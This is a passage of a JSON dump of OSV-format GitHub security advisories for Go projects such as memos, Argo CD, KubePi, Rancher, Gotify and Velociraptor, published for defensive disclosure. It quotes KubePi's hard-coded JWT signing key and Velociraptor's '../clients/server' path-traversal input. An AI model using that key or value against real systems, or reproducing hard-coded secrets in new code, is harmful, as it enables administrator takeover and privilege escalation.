[{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0111"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/46c13a4b7f675b92d297df6dabb4441f13c7cd9c"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/70da256c-977a-487e-8a6a-9ae22caedbe3"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:52:08Z", "nvd_published_at": "2023-01-07T04:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q9hr-j4rf-8fjc", "modified": "2023-02-07T21:21:41Z", "published": "2023-01-25T22:02:52Z", "aliases": ["CVE-2023-22482"], "summary": "JWT audience claim is not verified", "details": "### Impact\n\nAll versions of Argo CD starting with v1.8.2 are vulnerable to an improper authorization bug causing the API to accept certain invalid tokens.\n\nOIDC providers include an `aud` (audience) claim in signed tokens. The value of that claim specifies the intended audience(s) of the token (i.e. the service or services which are meant to accept the token). Argo CD _does_ validate that the token was signed by Argo CD's configured OIDC provider. But Argo CD _does not_ validate the audience claim, so it will accept tokens that are not intended for Argo CD.\n\nIf Argo CD's configured OIDC provider also serves other audiences (for example, a file storage service), then Argo CD will accept a token intended for one of those other audiences. Argo CD will grant the user privileges based on the token's `groups` claim, even though those groups were not intended to be used by Argo CD.\n\nThis bug also increases the blast radius of a stolen token. If an attacker steals a valid token for a different audience, they can use it to access Argo CD.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.6.0-rc5\n* v2.5.8\n* v2.4.20\n* v2.3.14\n\nThe patch introduces a new `allowedAudiences` to the OIDC config block. By default, the client ID is the only allowed audience. Users who _want_ Argo CD to accept tokens intended for a different audience may use `allowedAudiences` to specify those audiences.\n\n```yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: argocd-cm\ndata:\n  oidc.config: |\n    name: Example\n    allowedAudiences:\n    - audience-1\n    - audience-2\n    - argocd-client-id  # If `allowedAudiences` is non-empty, Argo CD's client ID must be explicitly added if you want to allow it.\n``\n\nEven though [the OIDC spec requires the audience claim](https://openid.net/specs/openid-connect-core-1_0.html#IDToken), some tokens may not include it. To avoid a breaking change in a patch release, versions < 2.6.0 of Argo CD will skip the audience claim check for tokens that have no audience. In versions >= 2.6.0, Argo CD will reject all tokens which do not have an audience claim. Users can opt into the old behavior by setting an option:\n\n```yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: argocd-cm\ndata:\n  oidc.config: |\n    name: Example\n    skipAudienceCheckWhenTokenHasNoAudience: true\n```\n\n### Workarounds\n\nThere is no workaround besides upgrading.\n\n### Credits \n\nThe Argo CD team would like to express their gratitude to Vladimir Pouzanov (@farcaller) from Indeed, who discovered the issue, reported it confidentially according to our [guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability), and actively worked with the project to provide a remedy. Many thanks to Vladimir!\n\n### References\n\n* [How to configure OIDC in Argo CD](https://argo-cd.readthedocs.io/en/latest/operator-manual/user-management/#existing-oidc-provider)\n* [OIDC spec section discussing the audience claim](https://openid.net/specs/openid-connect-core-1_0.html#IDToken)\n* [JWT spec section discussing the audience claim](https://www.rfc-editor.org/rfc/rfc7519#section-4.1.3)\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.2"}, {"fixed": "2.3.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.20"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0-rc1"}, {"fixed": "2.6.0-rc5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-q9hr-j4rf-8fjc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22482"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-01-25T22:02:52Z", "nvd_published_at": "2023-01-26T21:18:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8686-4cr3-76wj", "modified": "2023-01-12T16:49:30Z", "published": "2023-01-07T06:30:20Z", "aliases": ["CVE-2023-0106"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.10.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0106"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/0f8ce3dd1696722f951d7195ad1f88b39a5d15d7"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/5c0809cb-f4ff-4447-bed6-b5625fb374bb"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:53:55Z", "nvd_published_at": "2023-01-07T04:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vjhf-8vqx-vqpq", "modified": "2023-01-06T17:37:58Z", "published": "2023-01-06T17:37:58Z", "aliases": ["CVE-2023-22463"], "summary": "KubePi allows malicious actor to login with a forged JWT token via Hardcoded Jwtsigkeys", "details": "### Summary\nThe jwt authentication function of kubepi <= v1.6.2 uses hard-coded Jwtsigkeys, resulting in the same Jwtsigkeys for all online projects. This means that an attacker can forge any jwt token to take over the administrator account of any online project. \n\n### Details\n[`session.go`](https://github.com/KubeOperator/KubePi/blob/da784f5532ea2495b92708cacb32703bff3a45a3/internal/api/v1/session/session.go#L35), the use of hard-coded JwtSigKey allows an attacker to use this value to forge jwt tokens arbitrarily. The JwtSigKey is confidential and should not be hard-coded in the code.\n\n```golang\nvar JwtSigKey = []byte(\"signature_hmac_secret_shared_key\")\nvar jwtMaxAge = 10 * time.Minute\n\ntype Handler struct {\n\tuserService        user.Service\n\troleService        role.Service\n\tclusterService     cluster.Service\n\trolebindingService rolebinding.Service\n\tldapService        ldap.Service\n\tjwtSigner          *jwt.Signer\n}\n```\n### Affected Version\n<= v1.6.2\n\n### Patches\nThe vulnerability has been fixed in [v1.6.3](https://github.com/KubeOperator/KubePi/releases/tag/v1.6.3).\n\nhttps://github.com/KubeOperator/KubePi/commit/3be58b8df5bc05d2343c30371dd5fcf6a9fbbf8b : JWT key can be specified in app.yml, if leave it blank a random key will be used.\n\n### Workarounds\nIt is recommended to upgrade the version to [v1.6.3](https://github.com/KubeOperator/KubePi/releases/tag/v1.6.3).\n\n### For more information\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/KubeOperator/KubePi/issues).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/KubeOperator/kubepi"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.6.2"}}], "references": [{"type": "WEB", "url": "https://github.com/KubeOperator/KubePi/security/advisories/GHSA-vjhf-8vqx-vqpq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22463"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubePi/commit/3be58b8df5bc05d2343c30371dd5fcf6a9fbbf8b"}, {"type": "PACKAGE", "url": "https://github.com/KubeOperator/KubePi"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubePi/blob/da784f5532ea2495b92708cacb32703bff3a45a3/internal/api/v1/session/session.go#L35"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubePi/releases/tag/v1.6.3"}], "database_specific": {"cwe_ids": ["CWE-798"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-01-06T17:37:58Z", "nvd_published_at": "2023-01-04T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v9mp-j8g7-2q6m", "modified": "2023-02-08T21:51:47Z", "published": "2023-01-30T06:30:27Z", "aliases": ["CVE-2023-24623"], "summary": "Paranoidhttp Server-Side Request Forgery vulnerability", "details": "Paranoidhttp before 0.3.0 allows SSRF because [::] is equivalent to the 127.0.0.1 address, but does not match the filter for private addresses.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hakobe/paranoidhttp"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-24623"}, {"type": "WEB", "url": "https://github.com/hakobe/paranoidhttp/commit/07f671da14ce63a80f4e52432b32e8d178d75fd3"}, {"type": "PACKAGE", "url": "https://github.com/hakobe/paranoidhttp"}, {"type": "WEB", "url": "https://github.com/hakobe/paranoidhttp/blob/master/CHANGELOG.md#v030-2023-01-19"}, {"type": "WEB", "url": "https://github.com/hakobe/paranoidhttp/compare/v0.2.0...v0.3.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1526"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T21:51:47Z", "nvd_published_at": "2023-01-30T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cq4p-vp5q-4522", "modified": "2023-02-15T18:40:09Z", "published": "2023-01-25T19:36:57Z", "aliases": ["CVE-2022-43757"], "summary": "Plaintext storage of sensitive data in Rancher API and cluster.management.cattle.io objects", "details": "### Impact\n\nThis issue affects Rancher versions from 2.5.0 up to and including 2.5.16, from 2.6.0 up to and including 2.6.9 and 2.7.0. It was discovered that the security advisory CVE-2021-36782 (GHSA-g7j7-h4q8-8w2f), previously released by Rancher, missed addressing some sensitive fields, secret tokens, encryption keys, and SSH keys that were still being stored in plaintext directly on Kubernetes objects like `Clusters`.\n\nThe exposed credentials are visible in Rancher to authenticated `Cluster Owners`, `Cluster Members`, `Project Owners` and `Project Members` of that cluster on the endpoints:\n\n- `/v1/management.cattle.io.cluster`\n- `/v1/management.cattle.io.clustertemplaterevisions`\n\nThe remaining sensitive fields are now stripped from `Clusters` and other objects and moved to a `Secret` before the object is stored. The `Secret` is retrieved when the credential is needed. For objects that existed before this security fix, a one-time migration happens on startup.\n\nThe fields that have been addressed by this security fix are:\n\n- `Cluster.Spec.RancherKubernetesEngineConfig.Services.KubeAPI.SecretsEncryptionConfig.CustomConfig.Providers[].AESGCM.Keys[].Secret`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Services.KubeAPI.SecretsEncryptionConfig.CustomConfig.Providers[].AESCBC.Keys[].Secret`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Services.KubeAPI.SecretsEncryptionConfig.CustomConfig.Providers[].SecretboxConfiguration.Keys[].Secret`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Services.Kubelet.ExtraEnv` when containing the `AWS_SECRET_ACCESS_KEY` environment variable\n- `Cluster.Spec.RancherKubernetesEngineConfig.BastionHost.SSHKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.PrivateRegistries[].ECRCredentialPlugin.AwsSecretAccessKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.PrivateRegistries[].ECRCredentialPlugin.AwsSessionToken`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Network.AciNetworkProvider.ApicUserKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Network.AciNetworkProvider.KafkaClientKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Network.AciNetworkProvider.Token`\n\n**Important:**\n\n- For the exposure of credentials not related to Rancher, the final impact severity for confidentiality, integrity and availability is dependent on the permissions the leaked credentials have on their services.\n\n- It is recommended to review for potentially leaked credentials in this scenario and to change them if deemed necessary.\n\n### Workarounds\n\nThere is no direct mitigation besides updating Rancher to a patched version.\n\n### Patches\n\nPatched versions include releases 2.5.17, 2.6.10, 2.7.1 and later versions.\n\nAfter upgrading to a patched version, it is important to check for the `ACISecretsMigrated` and `RKESecretsMigrated` conditions on `Clusters` and `ClusterTemplateRevisions` to confirm when secrets have been fully migrated off of those objects, and the objects scoped within them.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-cq4p-vp5q-4522"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-43757"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1205295"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-256", "CWE-312"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-25T19:36:57Z", "nvd_published_at": "2023-02-07T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3244-8mff-w398", "modified": "2023-01-10T22:48:43Z", "published": "2023-01-10T22:48:43Z", "aliases": [], "summary": "Reflected XSS in Gotify's /docs via import of outdated Swagger UI", "details": "### Impact\n\nGotify exposes an outdated instance of the [Swagger UI](https://swagger.io/tools/swagger-ui/) API documentation frontend at `/docs` which is susceptible to reflected XSS attacks when loading external Swagger config files.\n\nSpecifically, the DOMPurify version included with this version of Swagger UI is vulnerable to a [rendering XSS](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/) incorporating the mutation payload detailed in [CVE-2020-26870](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/) which was patched in 2021. This is further tracked in the GitHub Advisory Database as GHSA-QRMM-W75W-3WPX.\n\nAn attacker can execute arbitrary JavaScript and potentially take over the account of the user that clicked the link. Keep in mind, the Gotify UI won't natively expose such a malicious link, so an attacker has to get the user to open the malicious link in a context outside of Gotify.\n\n### Patches\n\nThe vulnerability has been fixed in version 2.2.3.\n\n### References\n\nhttps://github.com/gotify/server/pull/541", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gotify/server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.2.2"}}], "references": [{"type": "WEB", "url": "https://github.com/gotify/server/security/advisories/GHSA-3244-8mff-w398"}, {"type": "WEB", "url": "https://github.com/gotify/server/pull/541"}, {"type": "PACKAGE", "url": "https://github.com/gotify/server"}, {"type": "WEB", "url": "https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/"}, {"type": "WEB", "url": "https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-10T22:48:43Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9h7x-9pmh-7gg8", "modified": "2023-01-12T16:49:06Z", "published": "2023-01-07T06:30:19Z", "aliases": ["CVE-2023-0112"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.10.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0112"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/46c13a4b7f675b92d297df6dabb4441f13c7cd9c"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/ec2a29dc-79a3-44bd-a58b-15f676934af6"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:51:50Z", "nvd_published_at": "2023-01-07T04:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gqx8-hxmv-c4v4", "modified": "2023-01-24T23:29:03Z", "published": "2023-01-09T21:56:09Z", "aliases": ["CVE-2023-22478"], "summary": "KubePi may allow unauthorized access to system API", "details": "### Summary\nUnauthorized access refers to the ability to bypass the system's preset permission settings to access some API interfaces. The attack exploits a flaw in how online applications handle routing permissions.\n\n### Affected Version\n<= v1.6.3\n\n### Patches\nThe vulnerability has been fixed in v1.6.4.\n\nhttps://github.com/KubeOperator/KubePi/commit/0c6774bf5d9003ae4d60257a3f207c131ff4a6d6\n\n### Workarounds\nIt is recommended to upgrade the version to v1.6.4.\n\n### For more information\nIf you have any questions or comments about this advisory, please open an issue.\n\n### References\nhttps://github.com/KubeOperator/KubePi/releases/tag/v1.6.4", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/KubeOperator/kubepi"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.6.3"}}], "references": [{"type": "WEB", "url": "https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-gqx8-hxmv-c4v4"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubePi/security/advisories/GHSA-gqx8-hxmv-c4v4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22478"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubePi/commit/0c6774bf5d9003ae4d60257a3f207c131ff4a6d6"}, {"type": "PACKAGE", "url": "https://github.com/KubeOperator/KubePi"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubePi/releases/tag/v1.6.4"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:56:09Z", "nvd_published_at": "2023-01-14T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2x48-p6cq-5xcw", "modified": "2023-01-31T01:59:08Z", "published": "2023-01-23T06:30:20Z", "aliases": ["CVE-2022-46959"], "summary": "Path Traversal in github.com/go-sonic/sonic", "details": "An issue in the component /admin/backups/work-dir of Sonic v1.0.4 allows attackers to execute a directory traversal.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-sonic/sonic"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-46959"}, {"type": "WEB", "url": "https://github.com/go-sonic/sonic/issues/56"}, {"type": "WEB", "url": "https://github.com/go-sonic/sonic/pull/61/commits/3b00266a13fa69284f4b3f4b37d29be8f8e02f31"}, {"type": "PACKAGE", "url": "https://github.com/go-sonic/sonic"}, {"type": "WEB", "url": "https://github.com/go-sonic/sonic/releases/tag/v1.0.5"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-23T20:37:57Z", "nvd_published_at": "2023-01-23T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jxgp-jgh3-8jc8", "modified": "2023-01-24T23:29:09Z", "published": "2023-01-09T21:57:54Z", "aliases": ["CVE-2023-22480"], "summary": "KubeOperator allows unauthorized access to system API", "details": "### Summary\n\nUnauthorized access refers to the ability to bypass the system's preset permission settings to access some API interfaces. The attack exploits a flaw in how online applications handle routing permissions.\n\n### Affected Version\n\n<= v3.16.3\n\n### Patches\n\nThe vulnerability has been fixed in v3.16.3.\n\nhttps://github.com/KubeOperator/KubeOperator/commit/7ef42bf1c16900d13e6376f8be5ecdbfdfb44aaf\n\n### Workarounds\n\nIt is recommended to upgrade the version to v3.16.4.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please open an issue.\n\n### References\n\nhttps://github.com/KubeOperator/KubeOperator/releases/tag/v3.16.4", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/KubeOperator/KubeOperator"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.16.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/KubeOperator/KubeOperator/security/advisories/GHSA-jxgp-jgh3-8jc8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22480"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubeOperator/commit/7ef42bf1c16900d13e6376f8be5ecdbfdfb44aaf"}, {"type": "PACKAGE", "url": "https://github.com/KubeOperator/KubeOperator"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubeOperator/releases/tag/v3.16.4"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:57:54Z", "nvd_published_at": "2023-01-14T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fpjc-cxr6-w6h8", "modified": "2023-01-12T16:49:23Z", "published": "2023-01-07T06:30:19Z", "aliases": ["CVE-2023-0108"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.10.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0108"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/46c13a4b7f675b92d297df6dabb4441f13c7cd9c"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/f66d33df-6588-4ab4-80a0-847451517944"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:53:46Z", "nvd_published_at": "2023-01-07T04:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pcvh-px2p-vmxw", "modified": "2023-01-12T16:49:37Z", "published": "2023-01-07T06:30:20Z", "aliases": ["CVE-2023-0107"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.10.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0107"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/0f8ce3dd1696722f951d7195ad1f88b39a5d15d7"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/0b28fa57-acb0-47c8-ac48-962ff3898156"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:54:06Z", "nvd_published_at": "2023-01-07T04:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7jf5-fvgf-48c6", "modified": "2023-02-01T01:37:24Z", "published": "2023-01-19T00:30:30Z", "aliases": ["CVE-2023-0290"], "summary": "Velociraptor subject to Path Traversal", "details": "Rapid7 Velociraptor did not properly sanitize the client ID parameter to the CreateCollection API, allowing a directory traversal in where the collection task could be written. It was possible to provide a client id of \"../clients/server\" to schedule the collection for the server (as a server artifact), but only require privileges to schedule collections on the client. Normally, to schedule an artifact on the server, the COLLECT_SERVER permission is required. This permission is normally only granted to \"administrator\" role. Due to this issue, it is sufficient to have the COLLECT_CLIENT privilege, which is normally granted to the \"investigator\" role. To exploit this vulnerability, the attacker must already have a Velociraptor user account at least \"investigator\" level, and be able to authenticate to the GUI and issue an API call to the backend. Typically, most users deploy Velociraptor with limited access to a trusted group, and most users will already be administrators within the GUI. This issue affects Velociraptor versions before 0.6.7-5. Version 0.6.7-5, released January 16, 2023, fixes the issue.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "www.velocidex.com/golang/velociraptor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.7-5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0290"}, {"type": "WEB", "url": "https://github.com/Velocidex/velociraptor/commit/4718bb0cb426564568abc77910e90a2c211a32e6"}, {"type": "PACKAGE", "url": "https://github.com/Velocidex/velociraptor"}, {"type": "WEB", "url": "https://github.com/Velocidex/velociraptor/compare/v0.6.7-4...v0.6.7-5"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-01T01:37:24Z", "nvd_published_at": "2023-01-18T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8fcj-gf77-47mg", "modified": "2023-02-07T15:50:58Z", "published": "2023-01-25T19:40:26Z", "aliases": ["CVE-2022-43756"], "summary": "Denial of service (DoS) when processing Git credentials", "details": "### Impact\n\nA denial of services (DoS) vulnerability was discovered in Wrangler Git package affecting versions up to and including `v1.0.0`.\n\nSpecially crafted Git credentials can result in a denial of service (DoS) attack on an application that uses Wrangler due to the exhaustion of the available memory and CPU resources. This is caused by a lack of input validation of Git credentials before they are used, which may lead to a denial of service in some cases. This issue can be triggered when accessing both private and public Git repositories. \n\n### Workarounds\n\nA workaround is to sanitize input passed to the Git package to remove potential unsafe and ambiguous characters. Otherwise, the best course of action is to update to a patched Wrangler version.\n\n### Patches\n\nPatched versions include `v1.0.1` and later and the backported tags - `v0.7.4-security1`, `v0.8.5-security1` and `v0.8.11`.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) or [Wrangler](https://github.com/rancher/wrangler/issues/new) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/wrangler"}, 